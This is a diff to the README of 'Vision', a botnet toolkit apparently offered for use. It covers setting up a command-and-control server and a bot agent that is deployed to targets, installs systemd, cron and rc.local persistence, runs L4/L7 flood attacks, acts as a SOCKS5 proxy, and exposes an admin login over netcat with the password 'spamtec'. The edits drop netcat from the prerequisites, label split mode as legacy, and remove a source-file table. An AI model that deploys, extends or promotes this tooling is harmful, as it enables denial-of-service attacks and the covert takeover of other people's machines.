@@ -75,7 +75,7 @@
 ### Prerequisites
 
 ```bash
-sudo apt update && sudo apt install -y openssl git wget gcc python3 screen netcat
+sudo apt update && sudo apt install -y openssl git wget gcc python3 screen 
 
 # Go 1.23+
 wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
@@ -111,12 +111,13 @@ To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bo
 
 ```bash
 ./server              # TUI mode (default)
-./server --split      # Telnet mode on admin port
+
+./server --split      # Telnet mode on admin port(legacy, only for those needing to manage multiple remote users)
 ```
 
 Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).
 
-Split mode: `nc YOUR_IP 420` → type `spamtec` → login.
+Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)
 
 ---
 
@@ -170,21 +171,6 @@ Vision has two components:
 **`cnc/`** — The Command & Control server. Dual-listener: TLS on 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`.
 
 **`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → singleton lock → environment detection → install persistence → DNS-resolve C2 → connect with reconnect loop.
-
-### Source Map
-
-| File | Purpose |
-|---|---|
-| `bot/config.go` | Runtime config: AES data blobs, config seed, sync token, build tag |
-| `bot/connection.go` | TLS connection, multi-method DNS resolution (DoH → UDP → A record → raw) |
-| `bot/attacks.go` | All L4/L7 flood methods |
-| `bot/opsec.go` | AES decryption, key derivation, environment detection |
-| `bot/persist.go` | Systemd, cron, rc.local persistence |
-| `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
-| `cnc/ui.go` | Bubble Tea TUI — views, keybindings, rendering |
-| `cnc/cmd.go` | Command dispatch and routing |
-| `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
-| `cnc/miscellaneous.go` | RBAC, user auth, utilities |
 
 ---
 
